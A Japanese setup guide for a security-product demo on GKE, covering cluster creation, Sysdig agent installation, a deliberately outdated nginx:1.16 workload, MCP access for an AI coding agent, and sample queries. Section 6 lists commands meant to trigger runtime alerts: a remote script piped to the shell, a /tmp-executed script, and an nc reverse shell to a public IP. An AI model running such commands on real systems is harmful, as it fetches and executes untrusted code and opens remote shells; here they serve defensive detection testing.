# GKE版 Headless Sysdig デモ構成

GKE はかなり良い選択です。
特に Headless Sysdig のデモでは:

- Kubernetes
- Cloud
- Runtime
- IAM
- Workload Identity
- Container Runtime

が自然につながるので、GKE は見栄えが良いです。さらに Google 系顧客にはかなり刺さります。

---

## 全体像

```
[Cursor / AI Agent]
        ↓
   MCP / API
        ↓
[Sysdig Secure SaaS]
        ↓
[GKE Cluster]
   ├─ vulnerable workload
   ├─ runtime events
   ├─ runtime agent
   └─ cloud posture
```

---

## 1. 必要アカウント

### 必須

- **① GCP Project** — 専用推奨
- **② Sysdig Secure Tenant** — Runtime enabled
- **③ Cursor Account** — または Claude Code

---

## 2. GCP側で必要なもの

### 推奨構成

| 項目 | 推奨 |
|------|------|
| GKE | Standard |
| Node | e2-standard-2 |
| Node数 | 2 |
| Region | asia-northeast1 |
| OS | Container-Optimized OS |

### なぜ Autopilot を避ける?

Runtime/Falco周りで制約が出やすい。デモは Standard が安定。

---

## 3. GKE クラスタ作成

### 推奨

```bash
gcloud container clusters create headless-demo \
  --region asia-northeast1 \
  --num-nodes 2
```

---

## 4. Sysdig Agent導入

### 最重要

#### Helm推奨

```bash
helm install sysdig-agent sysdig/sysdig-deploy \
  --namespace sysdig-agent \
  --create-namespace
```

#### 必須機能 ON

| 機能 | 必須 |
|------|------|
| Runtime | YES |
| Vulnerability | YES |
| KSPM | YES |
| Inventory | YES |

---

## 5. デモ用Workload

### 必須

#### 脆弱イメージ

超おすすめ:

```yaml
image: nginx:1.16
```

#### Namespace

```bash
kubectl create ns production
```

#### デプロイ

```bash
kubectl create deployment vulnerable-nginx \
  --image=nginx:1.16 \
  -n production
```

---

## 6. Runtime Event生成

ここ超重要。

### まず Pod に入る

```bash
kubectl exec -it podname -n production -- sh
```

### 発火例

#### curl | sh

```bash
curl http://example.com/test.sh | sh
```

#### tmp execution

```bash
echo "id" > /tmp/test.sh
chmod +x /tmp/test.sh
/tmp/test.sh
```

#### suspicious binary

```bash
nc -e /bin/sh 1.1.1.1 4444
```

---

## 7. GCP連携 (強く推奨)

これで「Cloud Context」が出る。

### 接続

GCP CSPM 有効化。

### 見せられるもの

- Public exposure
- IAM
- Service Account
- Bucket exposure
- GKE posture

---

## 8. Cursor側準備

### 必須

#### MCP設定
Sysdig Headless endpoint。

#### API Token
Read権限。

#### 推奨権限

| 領域 | 推奨 |
|------|------|
| Runtime | YES |
| Inventory | YES |
| Vulnerability | YES |
| Posture | YES |

---

## 9. デモで実際に打つクエリ

### Runtime系

```
Investigate the latest runtime threat in production namespace.
```

### Vulnerability系

```
Show critical vulnerabilities affecting running workloads.
```

### Exposure系

```
Which internet exposed workloads have critical CVEs?
```

### Kubernetes系

```
Summarize the security posture of the production namespace.
```

---

## 10. GKEだからこそ刺さる話

### Workload Identity

GKE 固有の IAM 連携。Service Account → GCP IAM の紐付けで、Pod 単位の権限を可視化できる。

> _Note: 元の説明はここで途切れていたため、補完が必要な箇所です。_
